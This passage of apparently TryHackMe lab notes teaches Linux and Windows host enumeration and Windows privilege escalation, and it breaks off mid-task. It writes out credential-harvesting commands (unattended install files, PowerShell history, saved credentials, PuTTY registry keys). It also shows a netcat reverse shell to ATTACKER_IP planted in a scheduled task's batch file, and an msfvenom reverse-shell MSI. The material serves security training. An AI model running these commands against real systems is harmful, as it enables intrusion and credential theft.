user@TryHackMe$ ip a s1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:0c:29:a2:0e:7e brd ff:ff:ff:ff:ff:ff
    inet 10.20.30.129/24 brd 10.20.30.255 scope global noprefixroute dynamic ens33
       valid_lft 1580sec preferred_lft 1580sec
    inet6 fe80::761a:b360:78:26cd/64 scope link noprefixroute
       valid_lft forever preferred_lft forever
```

The DNS servers can be found in the `/etc/resolv.conf`. Consider the following terminal output for a system that uses DHCP for its network configurations. The DNS, i.e. nameserver, is set to `10.20.30.2`.

Terminal

```
user@TryHackMe$ cat /etc/resolv.conf# Generated by NetworkManagersearch localdomain thm
nameserver 10.20.30.2
```

`netstat` is a useful command for learning about network 
connections, routing tables, and interface statistics. We explain some 
of its many options in the table below.

| Option | Description |
| --- | --- |
| `-a` | show both listening and non-listening sockets |
| `-l` | show only listening sockets |
| `-n` | show numeric output instead of resolving the IP address and port number |
| `-t` | TCP |
| `-u` | UDP |
| `-x` | UNIX |
| `-p` | Show the PID and name of the program to which the socket belongs |

You can use any combination that suits your needs. For instance, `netstat -plt` will return *Programs Listening on TCP* sockets. As we can see in the terminal output below, `sshd` is listening on the SSH port, while `master` is listening on the SMTP port on both IPv4 and IPv6 addresses. Note that to get all PID (process ID) and program names, you need to run `netstat` as root or use `sudo netstat`.

Terminal

```
user@TryHackMe$ sudo netstat -pltActive Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:ssh             0.0.0.0:*               LISTEN      978/sshd
tcp        0      0 localhost:smtp          0.0.0.0:*               LISTEN      1141/master
tcp6       0      0 [::]:ssh                [::]:*                  LISTEN      978/sshd
tcp6       0      0 localhost:smtp          [::]:*                  LISTEN      1141/master
```

`netstat -atupn` will show *All TCP and UDP* listening and established connections and the *program* names with addresses and ports in *numeric* format.

Terminal

```
user@TryHackMe$ sudo netstat -atupnActive Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      978/sshd
tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      1141/master
tcp        0      0 10.20.30.129:22         10.20.30.113:38822        ESTABLISHED 5665/sshd: peter [p
tcp        0      0 10.20.30.129:22         10.20.30.105:38826        ESTABLISHED 5723/sshd: jane [pr
tcp6       0      0 :::22                   :::*                    LISTEN      978/sshd
tcp6       0      0 ::1:25                  :::*                    LISTEN      1141/master
udp        0      0 127.0.0.1:323           0.0.0.0:*                           640/chronyd
udp        0      0 0.0.0.0:68              0.0.0.0:*                           5638/dhclient
udp6       0      0 ::1:323                 :::*                                640/chronyd
```

One might think that using `nmap` before gaining access to the target machine would have provided a comparable result. However, this is not entirely true. Nmap
 needs to generate a relatively large number of packets to check for 
open ports, which can trigger intrusion detection and prevention 
systems. Furthermore, firewalls across the route can drop certain 
packets and hinder the scan, resulting in incomplete Nmap results.

`lsof` stands for List Open Files. If we want to display only Internet and network connections, we can use `lsof -i`. The terminal output below shows IPv4 and IPv6 listening services and ongoing connections. The user `peter` is connected to the server `rpm-red-enum.thm` on the `ssh` port. Note that to get the complete list of matching programs, you need to run `lsof` as root or use `sudo lsof`.

Terminal

```
user@TryHackMe$ sudo lsof -iCOMMANDPID      USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
chronyd   640    chrony    5u  IPv4  16945      0t0  UDP localhost:323
chronyd   640    chrony    6u  IPv6  16946      0t0  UDP localhost:323
sshd      978      root    3u  IPv4  20035      0t0  TCP *:ssh (LISTEN)
sshd      978      root    4u  IPv6  20058      0t0  TCP *:ssh (LISTEN)
master   1141      root   13u  IPv4  20665      0t0  TCP localhost:smtp (LISTEN)
master   1141      root   14u  IPv6  20666      0t0  TCP localhost:smtp (LISTEN)
dhclient 5638      root    6u  IPv4  47458      0t0  UDP *:bootpc
sshd     5693     peter    3u  IPv4  47594      0t0  TCP rpm-red-enum.thm:ssh->10.20.30.113:38822 (ESTABLISHED)
[...]
```

Because the list can get quite lengthy, you can further filter 
the output by specifying the ports you are interested in, such as SMTP port 25. By running `lsof -i :25`,
 we limit the output to those related to port 25, as shown in the 
terminal output below. The server is listening on port 25 on both IPv4 
and IPv6 addresses.

Terminal

```
user@TryHackMe$ sudo lsof -i :25COMMANDPID USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
master  1141 root   13u  IPv4  20665      0t0  TCP localhost:smtp (LISTEN)
master  1141 root   14u  IPv6  20666      0t0  TCP localhost:smtp (LISTEN)
```

### Running Services

Getting a snapshot of the running processes can provide many insights. `ps` lets you discover the running processes and plenty of information about them.

You can list every process on the system using `ps -e`, where `-e` selects all processes. For more information about the process, you can add `-f` for full-format and`-l` for long format. Experiment with `ps -e`, `ps -ef`, and `ps -el`.

You can get comparable output and see all the processes using BSD syntax: `ps ax` or `ps aux`. Note that `a` and `x`
 are necessary when using BSD syntax as they lift the “only yourself” 
and “must have a tty” restrictions; in other words, it becomes possible 
to display all processes. The `u` is for details about the user that has the process.

| Option | Description |
| --- | --- |
| `-e` | all processes |
| `-f` | full-format listing |
| `-j` | jobs format |
| `-l` | long format |
| `-u` | user-oriented format |

For more “visual” output, you can issue `ps axjf` to print a process tree. The `f` stands for “forest”, and it creates an ASCII art process hierarchy as shown in the terminal output below.

Terminal

```
user@TryHackMe$ ps axfPID TTY      STAT   TIME COMMAND
     2 ?        S      0:00 [kthreadd]
     4 ?        S<     0:00  \_ [kworker/0:0H]
     5 ?        S      0:01  \_ [kworker/u256:0]
[...]
   978 ?        Ss     0:00 /usr/sbin/sshd -D
  5665 ?        Ss     0:00  \_ sshd: peter [priv]
  5693 ?        S      0:00  |   \_ sshd: peter@pts/1
  5694 pts/1    Ss     0:00  |       \_ -bash
  5713 pts/1    S+     0:00  |           \_ vi notes.txt
  5723 ?        Ss     0:00  \_ sshd: jane [priv]
  5727 ?        S      0:00      \_ sshd: jane@pts/0
  5728 pts/0    Ss     0:00          \_ -bash
  7080 pts/0    R+     0:00              \_ ps axf
   979 ?        Ssl    0:12 /usr/bin/python2 -Es /usr/sbin/tuned -l -P
   981 ?        Ssl    0:07 /usr/sbin/rsyslogd -n
  1141 ?        Ss     0:00 /usr/libexec/postfix/master -w
  1147 ?        S      0:00  \_ qmgr -l -t unix -u
  6991 ?        S      0:00  \_ pickup -l -t unix -u
  1371 ?        Ss     0:00 login -- root
  1376 tty1     Ss     0:00  \_ -bash
  1411 tty1     S+     0:00      \_ man man
  1420 tty1     S+     0:00          \_ less -s
[...]
```

To summarize, remember to use `ps -ef` or `ps aux` to get a list of all the running processes. Consider piping the output via `grep` to display output lines with certain words. The terminal output below shows the lines with `peter` in them.

Terminal

```
user@TryHackMe$ ps -ef | grep peterroot       5665    978  0 07:11 ?        00:00:00 sshd: peter [priv]
peter      5693   5665  0 07:13 ?        00:00:00 sshd: peter@pts/1
peter      5694   5693  0 07:13 pts/1    00:00:00 -bash
peter      5713   5694  0 07:13 pts/1    00:00:00 vi notes.txt
```

**Windows Enumeration**

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/0e4c217223af2541ddb04d61ddd9753d.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/0e4c217223af2541ddb04d61ddd9753d.png)

In this task, we assume you have access to `cmd` on a
 Microsoft Windows host. You might have gained this access by exploiting
 a vulnerability and getting a shell or a reverse shell. You may also 
have installed a backdoor or set up an SSH server on a system you exploited. In all cases, the commands below require `cmd` to run.

In this task, we focus on enumerating an MS Windows host. For enumerating MS Active directory, you are encouraged to check the [Enumerating Active Directory](https://tryhackme.com/room/adenumeration) room. If you are interested in a privilege escalation on an MS Windows host, we recommend the [Windows Privesc 2.0](https://tryhackme.com/room/windowsprivesc20) room.

We recommend that you click "**Start AttackBox**" and "**Start Machine**" so that you can experiment and answer the questions at the end of this task.

### System

One command that can give us detailed information about the system, such as its build number and installed patches, would be `systeminfo`. In the example below, we can see which hotfixes have been installed.

Terminal

```
C:\>systeminfo

Host Name:                 WIN-SERVER-CLI
OS Name:                   Microsoft Windows Server 2022 Standard
OS Version:                10.0.20348 N/A Build 20348
OS Manufacturer:           Microsoft Corporation
[...]
Hotfix(s):                 3 Hotfix(s) Installed.
                           [01]: KB5013630
                           [02]: KB5013944
                           [03]: KB5012673
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) 82574L Gigabit Network Connection
[...]
```

You can check installed updates using `wmic qfe get Caption,Description`. This information will give you an idea of how quickly systems are being patched and updated.

Terminal

```
C:\>wmic qfe get Caption,Description
Caption                                     Description
http://support.microsoft.com/?kbid=5013630  Update
https://support.microsoft.com/help/5013944  Security Update
                                            Update
```

You can check the installed and started Windows services using `net start`. Expect to get a long list; the output below has been snipped.

Terminal

```
C:\>net start
These Windows services are started:

   Base Filtering Engine
   Certificate Propagation
   Client License Service (ClipSVC)
   COM+ Event System
   Connected User Experiences and Telemetry
   CoreMessaging
   Cryptographic Services
   DCOM Server Process Launcher
   DHCP Client
   DNS Client
[...]
   Windows Time
   Windows Update
   WinHTTP Web Proxy Auto-Discovery Service
   Workstation

The command completed successfully.
```

If you are only interested in installed apps, you can issue `wmic product get name,version,vendor`. If you run this command on the attached virtual machine, you will get something similar to the following output.

Terminal

```
C:\>wmic product get name,version,vendor
Name                                                            Vendor                                   Version
Microsoft Visual C++ 2019 X64 Minimum Runtime - 14.28.29910     Microsoft Corporation                    14.28.29910
[...]
Microsoft Visual C++ 2019 X64 Additional Runtime - 14.28.29910  Microsoft Corporation                    14.28.29910
```

### Users

To know who you are, you can run `whoami`; moreover, to know what you are capable of, i.e., your privileges, you can use `whoami /priv`. An example is shown in the terminal output below.

Terminal

```
C:\>whoami
win-server-cli\strategos

> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
[...]
```

Moreover, you can use `whoami /groups` to know which groups you belong to. The terminal output below shows that this user belongs to the `NT AUTHORITY\Local account and member of Administrators group` among other groups.

Terminal

```
C:\>whoami /groups

GROUP INFORMATION
-----------------

Group Name                                                    Type             SID          Attributes
============================================================= ================ ============ ===============================================================
Everyone                                                      Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account and member of Administrators group Well-known group S-1-5-114    Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                                        Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner
[...]
```

You can view users by running `net user`.

Terminal

```
C:\>net user

User accounts for \\WIN-SERVER-CLI

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest
michael                  peter                    strategos
WDAGUtilityAccount
The command completed successfully.
```

You can discover the available groups using `net group` if the system is a Windows Domain Controller or `net localgroup` otherwise, as shown in the terminal below.

Terminal

```
C:\>net localgroup

Aliases for \\WIN-SERVER-CLI

-------------------------------------------------------------------------------
*Access Control Assistance Operators
*Administrators
*Backup Operators
*Certificate Service DCOM Access
*Cryptographic Operators
*Device Owners
[...]
```

You can list the users that belong to the local administrators’ group using the command `net localgroup administrators`.

Terminal

```
C:\>net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
michael
peter
strategos
The command completed successfully.
```

Use `net accounts` to see the local settings on a machine; moreover, you can use `net accounts /domain`
 if the machine belongs to a domain. This command helps learn about 
password policy, such as minimum password length, maximum password age, 
and lockout duration.

### Networking

You can use the `ipconfig` command to learn about your system network configuration. If you want to know all network-related settings, you can use `ipconfig /all`. The terminal output below shows the output when using `ipconfig`. For instance, we could have used `ipconfig /all` if we wanted to learn the DNS servers.

Terminal

```
C:\>ipconfig

Windows IP Configuration

Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : localdomain
   Link-local IPv6 Address . . . . . : fe80::3dc5:78ef:1274:a740%5
   IPv4 Address. . . . . . . . . . . : 10.20.30.130
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.20.30.2
```

On MS Windows, we can use `netstat` to get various 
information, such as which ports the system is listening on, which 
connections are active, and who is using them. In this example, we use 
the options `-a` to display all listening ports and active connections. The `-b` lets us find the binary involved in the connection, while `-n` is used to avoid resolving IP addresses and port numbers. Finally, `-o` display the process ID (PID).

In the partial output shown below, we can see that `netstat -abno` showed that the server is listening on TCP ports 22, 135, 445 and 3389. The processes`sshd.exe`, `RpcSs`, and `TermService` are on ports `22`, `135`, and `3389`, respectively. Moreover, we can see two established connections to the SSH server as indicated by the state `ESTABLISHED`.

Terminal

```
C:\>netstat -abno

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:22             0.0.0.0:0              LISTENING       2016
 [sshd.exe]
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       924
  RpcSs
 [svchost.exe]
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
 Can not obtain ownership information
  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       416
  TermService
 [svchost.exe]
[...]
  TCP    10.20.30.130:22        10.20.30.1:39956       ESTABLISHED     2016
 [sshd.exe]
  TCP    10.20.30.130:22        10.20.30.1:39964       ESTABLISHED     2016
 [sshd.exe]
[...]

```

You might think that you can get an identical result by port scanning
 the target system; however, this is inaccurate for two reasons. A 
firewall might be blocking the scanning host from reaching specific 
network ports. Moreover, port scanning a system generates a considerable
 amount of traffic, unlike `netstat`, which makes zero noise.

Finally, it is worth mentioning that using `arp -a` helps you discover other systems on the same LAN that recently communicated with your system. ARP stands for Address Resolution Protocol; `arp -a` shows the current ARP
 entries, i.e., the physical addresses of the systems on the same LAN 
that communicated with your system. An example output is shown below. 
This indicates that these IP addresses have communicated somehow with 
our system; the communication can be an attempt to connect or even a 
simple ping. Note that `10.10.255.255` does not represent a system as it is the subnet broadcast address.

Terminal

```
C:\>arp -a

Interface: 10.10.204.175 --- 0x4
  Internet Address      Physical Address      Type
  10.10.0.1             02-c8-85-b5-5a-aa     dynamic
  10.10.16.117          02-f2-42-76-fc-ef     dynamic
  10.10.122.196         02-48-58-7b-92-e5     dynamic
  10.10.146.13          02-36-c1-4d-05-f9     dynamic
  10.10.161.4           02-a8-58-98-1a-d3     dynamic
  10.10.217.222         02-68-10-dd-be-8d     dynamic
  10.10.255.255         ff-ff-ff-ff-ff-ff     static
```

**DNS, SMB, and SNMP**

As we cover enumeration, it is a good idea to touch on DNS, SMB, and SNMP.

### DNS

We are all familiar with Domain Name System (DNS)
 queries where we can look up A, AAAA, CName, and TXT records, among 
others. If you want to brush up on your DNS knowledge, we suggest you 
visit the [DNS in Detail](https://tryhackme.com/room/dnsindetail) room. If we can get a “copy” of all the records that a DNS server is responsible for answering, we might discover hosts we didn’t know existed.

One easy way to try DNS zone transfer is via the `dig` command. If you want to learn more about `dig` and similar commands, we suggest checking the [Passive Reconnaissance](https://tryhackme.com/room/passiverecon) room. Depending on the DNS server configuration, DNS zone transfer might be restricted. If it is not restricted, it should be achievable using `dig -t AXFR DOMAIN_NAME @DNS_SERVER`. The `-t AXFR` indicates that we are requesting a zone transfer, while `@` precedes the `DNS_SERVER` that we want to query regarding the records related to the specified `DOMAIN_NAME`.

### SMB

Server Message Block (SMB) is a communication protocol that provides shared access to files and printers. We can check shared folders using `net share`. Here is an example of the output. We can see that `C:\Internal Files` is shared under the name *Internal*.

Terminal

```
user@TryHackMe$ net shareShare name   Resource                        Remark

-------------------------------------------------------------------------------
C$           C:\                             Default shareIPC$                                         RemoteIPCADMIN$       C:\Windows                      Remote AdminInternal     C:\Internal Files               Internal Documents
Users        C:\Users
The command completed successfully.
```

### SNMP

Simple Network Management Protocol (SNMP) was designed to help 
collect information about different devices on the network. It lets you 
know about various network events, from a server with a faulty disk to a
 printer out of ink. Consequently, SNMP can hold a trove of information 
for the attacker. One simple tool to query servers related to SNMP is `snmpcheck`. You can find it on the AttackBox at the `/opt/snmpcheck/` directory; the syntax is quite simple: `/opt/snmpcheck/snmpcheck.rb MACHINE_IP -c COMMUNITY_STRING`.

If you would like to install

```
snmpcheck
```

on your local

Linux

box, consider the following commands.

Terminal

```
git clone https://gitlab.com/kalilinux/packages/snmpcheck.git
cd snmpcheck/
gem install snmp
chmod +x snmpcheck-1.9.rb
```

**More Tools for Windows**

In this room, our
 focus has been on command-line built-in tools readily available on any 
modern MS Windows system. We didn’t cover Graphical User Interface (GUI) tools; moreover, we didn’t cover any programs requiring additional downloading and installation steps.

This task mentions three options that are not built-in command-line tools:

- Sysinternals Suite
- Process Hacker
- GhostPack Seatbelt

### Sysinternals Suite

The [Sysinternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/) is a group of command-line and GUI
 utilities and tools that provides information about various aspects 
related to the Windows system. To give you an idea, we listed a few 
examples in the table below.

| Utility Name | Description |
| --- | --- |
| Process Explorer | Shows the processes along with the open files and registry keys |
| Process Monitor | Monitor the file system, processes, and Registry |
| PsList | Provides information about processes |
| PsLoggedOn | Shows the logged-in users |

Check [Sysinternals Utilities Index](https://docs.microsoft.com/en-us/sysinternals/downloads/) for a complete list of the utilities. If you want to learn more and experiment with these different utilities, we suggest the [Sysinternals](https://tryhackme.com/room/btsysinternalssg) room.

### Process Hacker

Another efficient and reliable MS Windows GUI tool that lets you gather information about running processes is [Process Hacker](https://processhacker.sourceforge.io/).
 Process Hacker gives you detailed information regarding running 
processes and related active network connections; moreover, it gives you
 deep insight into system resource utilization from CPU and memory to disk and network.

### GhostPack Seatbelt

[Seatbelt](https://github.com/GhostPack/Seatbelt),
 part of the GhostPack collection, is a tool written in C#. It is not 
officially released in binary form; therefore, you are expected to 
compile it yourself using MS Visual Studio.

### **WINDOWS PRIVILEGE ESCALATION**

**Windows Privilege Escalation**

Simply put, privilege 
escalation consists of using given access to a host with "user A" and 
leveraging it to gain access to "user B" by abusing a weakness in the 
target system. While we will usually want "user B" to have 
administrative rights, there might be situations where we'll need to 
escalate into other unprivileged accounts before actually getting 
administrative privileges.

Gaining access to different accounts can be as simple as finding 
credentials in text files or spreadsheets left unsecured by some 
careless user, but that won't always be the case. Depending on the 
situation, we might need to abuse some of the following weaknesses:

- Misconfigurations on Windows services or scheduled tasks
- Excessive privileges assigned to our account
- Vulnerable software
- Missing Windows security patches

Before jumping into the actual techniques, let's look at the different account types on a Windows system.

## Windows Users

Windows systems mainly have two kinds of users. Depending on their access levels, we can categorise a user in one of the following groups:

| **Administrators** | These users have the most privileges. They can change any system configuration parameter and access any file in the system. |
| --- | --- |
| **Standard Users** | These
 users can access the computer but only perform limited tasks. Typically
 these users can not make permanent or essential changes to the system 
and are limited to their files. |

Any user with administrative privileges will be part of the **Administrators** group. On the other hand, standard users are part of the **Users** group.

In addition to that, you will usually hear about some special 
built-in accounts used by the operating system in the context of 
privilege escalation:

| **SYSTEM / LocalSystem** | An
 account used by the operating system to perform internal tasks. It has 
full access to all files and resources available on the host with even 
higher privileges than administrators. |
| --- | --- |
| **Local Service** | Default account used to run Windows services with "minimum" privileges. It will use anonymous connections over the network. |
| **Network Service** | Default
 account used to run Windows services with "minimum" privileges. It will
 use the computer credentials to authenticate through the network. |

These accounts are created and managed 
by Windows, and you won't be able to use them as other regular accounts.
 Still, in some situations, you may gain their privileges due to 
exploiting specific services.

**Harvesting Passwords from Usual Spots**

The easiest way to gain 
access to another user is to gather credentials from a compromised 
machine. Such credentials could exist for many reasons, including a 
careless user leaving them around in plaintext files; or even stored by 
some software like browsers or email clients.

This task will present some known places to look for passwords on a Windows system.

Before going into the task, remember to click the **Start Machine** button. You will be using the same machine throughout tasks 3 to 5. If you are using the **AttackBox**, this is also a good moment to start it as you'll be needing it for the following tasks.

In case you prefer connecting to the target machine via RDP, you can use the following credentials:

**User:** `thm-unpriv`

**Password:** `Password321`

## Unattended Windows Installations

When installing Windows on a large number of hosts, administrators 
may use Windows Deployment Services, which allows for a single operating
 system image to be deployed to several hosts through the network. These
 kinds of installations are referred to as unattended installations as 
they don't require user interaction. Such installations require the use 
of an administrator account to perform the initial setup, which might 
end up being stored in the machine in the following locations:

- C:\Unattend.xml
- C:\Windows\Panther\Unattend.xml
- C:\Windows\Panther\Unattend\Unattend.xml
- C:\Windows\system32\sysprep.inf
- C:\Windows\system32\sysprep\sysprep.xml

As part of these files, you might encounter credentials:

```
<Credentials>
    <Username>Administrator</Username>
    <Domain>thm.local</Domain>
    <Password>MyPassword123</Password>
</Credentials>
```

## Powershell History

Whenever a user runs a command using Powershell, it gets stored into a
 file that keeps a memory of past commands. This is useful for repeating
 commands you have used before quickly. If a user runs a command that 
includes a password directly as part of the Powershell command line, it 
can later be retrieved by using the following command from a `cmd.exe` prompt:

```
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

**Note:** The command above will only work from cmd.exe, as Powershell won't recognize `%userprofile%` as an environment variable. To read the file from Powershell, you'd have to replace `%userprofile%` with `$Env:userprofile`.

## Saved Windows Credentials

Windows allows us to use other users' credentials. This function also
 gives the option to save these credentials on the system. The command 
below will list saved credentials:

```
cmdkey /list
```

While you can't see the actual passwords, if you notice any credentials worth trying, you can use them with the `runas` command and the `/savecred` option, as seen below.

```
runas /savecred /user:admin cmd.exe
```

## IIS Configuration

Internet Information Services (IIS) is the default web server on 
Windows installations. The configuration of websites on IIS is stored in
 a file called `web.config` and can store passwords for 
databases or configured authentication mechanisms. Depending on the 
installed version of IIS, we can find web.config in one of the following
 locations:

- C:\inetpub\wwwroot\web.config
- C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config

Here is a quick way to find database connection strings on the file:

```
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

## Retrieve Credentials from Software: PuTTY

PuTTY is an SSH
 client commonly found on Windows systems. Instead of having to specify a
 connection's parameters every single time, users can store sessions 
where the IP, user and other configurations can be stored for later use.
 While PuTTY won't allow users to store their SSH password, it will 
store proxy configurations that include cleartext authentication 
credentials.

To retrieve the stored proxy credentials, you can search under the 
following registry key for ProxyPassword with the following command:

```
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

**Note:** Simon Tatham is the creator of PuTTY (and his name is 
part of the path), not the username for which we are retrieving the 
password. The stored proxy username should also be visible after running
 the command above.

Just as putty stores credentials, any software that stores passwords, including browsers, email clients, FTP clients, SSH clients, VNC software and others, will have methods to recover any passwords the user has saved.

**Other Quick Wins**

Privilege escalation is
 not always a challenge. Some misconfigurations can allow you to obtain 
higher privileged user access and, in some cases, even administrator 
access. It would help if you considered these to belong more to the 
realm of CTF events rather than scenarios you will encounter during real
 penetration testing engagements. However, if none of the previously 
mentioned methods works, you can always go back to these.

## Scheduled Tasks

Looking into scheduled tasks on the target system, you may see a 
scheduled task that either lost its binary or it's using a binary you 
can modify.

Scheduled tasks can be listed from the command line using the `schtasks` command
 without any options. To retrieve detailed information about any of the 
services, you can use a command like the following one:

Command Prompt

```
C:\> schtasks /query /tn vulntask /fo list /v
Folder: \
HostName:                             THM-PC1
TaskName:                             \vulntask
Task To Run:                          C:\tasks\schtask.bat
Run As User:                          taskusr1
```

You will get lots of information about the task, but what matters for
 us is the "Task to Run" parameter which indicates what gets executed by
 the scheduled task, and the "Run As User" parameter, which shows the 
user that will be used to execute the task.

If our current user can modify or overwrite the "Task to Run" 
executable, we can control what gets executed by the taskusr1 user, 
resulting in a simple privilege escalation. To check the file 
permissions on the executable, we use `icacls`:

Command Prompt

```
C:\> icacls c:\tasks\schtask.bat
c:\tasks\schtask.bat NT AUTHORITY\SYSTEM:(I)(F)
                    BUILTIN\Administrators:(I)(F)
                    BUILTIN\Users:(I)(F)
```

As can be seen in the result, the **BUILTIN\Users** 
group has full access (F) over the task's binary. This means we can 
modify the .bat file and insert any payload we like. For your 
convenience, `nc64.exe` can be found on `C:\tools`. Let's change the bat file to spawn a reverse shell:

Command Prompt

```
C:\> echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
```

We then start a listener on the attacker machine on the same port we indicated on our reverse shell:

```
nc -lvp 4444
```

The next time the scheduled task runs, you should receive the reverse
 shell with taskusr1 privileges. While you probably wouldn't be able to 
start the task in a real scenario and would have to wait for the 
scheduled task to trigger, we have provided your user with permissions 
to start the task manually to save you some time. We can run the task 
with the following command:

Command Prompt

```
C:\> schtasks /run /tn vulntask
```

And you will receive the reverse shell with taskusr1 privileges as expected:

Kali Linux

```
user@attackerpc$ nc -lvp 4444Listening on 0.0.0.0 4444
Connection received on 10.10.175.90 50649
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
wprivesc1\taskusr1
```

Go to taskusr1 desktop to retrieve a flag. Don't forget to input the flag at the end of this task.

## AlwaysInstallElevated

Windows installer files (also known as .msi files) are used to 
install applications on the system. They usually run with the privilege 
level of the user that starts it. However, these can be configured to 
run with higher privileges from any user account (even unprivileged 
ones). This could potentially allow us to generate a malicious MSI file 
that would run with admin privileges.

**Note:** The AlwaysInstallElevated method won't work on this room's machine and it's included as information only.

This method requires two registry values to be set. You can query these from the command line using the commands below.

Command Prompt

```
C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

To be able to exploit this vulnerability, both should be set. 
Otherwise, exploitation will not be possible. If these are set, you can 
generate a malicious .msi file using `msfvenom`, as seen below:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
```

As this is a reverse shell, you should also run the Metasploit
 Handler module configured accordingly. Once you have transferred the 
file you have created, you can run the installer with the command below 
and receive the reverse shell:

Command Prompt

```
C:\> msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
```

**Abusing Service Misconfigurations**

## Windows Services

Windows services are managed by the **Service Control Manager**
 (SCM). The SCM is a process in charge of managing the state of services
 as needed, checking the current status of any given service and 
generally providing a way to configure services.

Each service on a Windows machine will have an associated executable 
which will be run by the SCM whenever a service is started. It is 
important to note that service executables implement special functions 
to be able to communicate with the SCM, and therefore not any executable
 can be started as a service successfully. Each service also specifies 
the user account under which the service will run.

To better understand the structure of a service, let's check the apphostsvc service configuration with the `sc qc` command:

Command Prompt

```
C:\> sc qc apphostsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: apphostsvc
        TYPE               : 20  WIN32_SHARE_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\system32\svchost.exe -k apphost
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Application Host Helper Service
        DEPENDENCIES       :
        SERVICE_START_NAME : localSystem
```

Here we can see that the associated executable is specified through the **BINARY_PATH_NAME** parameter, and the account used to run the service is shown on the **SERVICE_START_NAME** parameter.

Services have a Discretionary Access Control List (DACL),
 which indicates who has permission to start, stop, pause, query status,
 query configuration, or reconfigure the service, amongst other 
privileges. The DACL can be seen from Process Hacker (available on your 
machine's desktop):

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/d8244cfd9d64a7be30f5fb0308fd0806.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/d8244cfd9d64a7be30f5fb0308fd0806.png)

All of the services configurations are stored on the registry under `HKLM\SYSTEM\CurrentControlSet\Services\`:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/06c05c134e4922ec8ff8d9b56382c58f.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/06c05c134e4922ec8ff8d9b56382c58f.png)

A subkey exists for every service in the system. Again, we can see the associated executable on the **ImagePath** value and the account used to start the service on the **ObjectName** value. If a DACL has been configured for the service, it will be stored in a subkey called **Security**. As you have guessed by now, only administrators can modify such registry entries by default.

## Insecure Permissions on Service Executable

If the executable associated with a service has weak permissions that
 allow an attacker to modify or replace it, the attacker can gain the 
privileges of the service's account trivially.

To understand how this works, let's look at a vulnerability found on 
Splinterware System Scheduler. To start, we will query the service 
configuration using `sc`:

Command Prompt

```
C:\> sc qc WindowsScheduler
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: windowsscheduler
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\PROGRA~2\SYSTEM~1\WService.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : System Scheduler Service
        DEPENDENCIES       :
        SERVICE_START_NAME : .\svcuser1
```

We can see that the service installed by the vulnerable software runs
 as svcuser1 and the executable associated with the service is in `C:\Progra~2\System~1\WService.exe`. We then proceed to check the permissions on the executable:

Command Prompt

```
C:\Users\thm-unpriv>icacls C:\PROGRA~2\SYSTEM~1\WService.exe
